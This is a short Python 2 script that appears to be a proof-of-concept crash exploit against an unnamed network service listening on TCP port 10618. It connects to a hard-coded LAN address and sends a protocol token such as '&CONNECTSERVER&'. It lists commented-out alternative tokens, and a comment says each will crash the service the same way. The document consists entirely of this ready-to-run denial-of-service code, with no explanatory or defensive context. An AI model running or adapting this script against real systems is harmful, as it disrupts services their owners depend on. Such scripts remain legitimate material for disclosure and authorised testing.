 #!c:\python\python.exe
 # uncomment whichever function youd like. theyll all crash in a similar way.

 import socket

 s = socket.socket(socket.AF_INET , socket.SOCK_STREAM)
 s.connect(('192.168.1.101', 10618))

 print "[*] connected"

 s.send("&CONNECTSERVER&")
 #s.send("&ADDENTRY&")
 #s.send("&FIN&")
 #s.send("&START&")
 #s.send("&LOGPATH&")
 #s.send("&FWADELTA&")
 #s.send("&FWALOG&")
 #s.send("&SETSYNCHRONOUS&")
 #s.send("&SETPRGFILE&")
 #s.send("&SETREPLYPORT&")

 print "disconnecting."

 s.close()
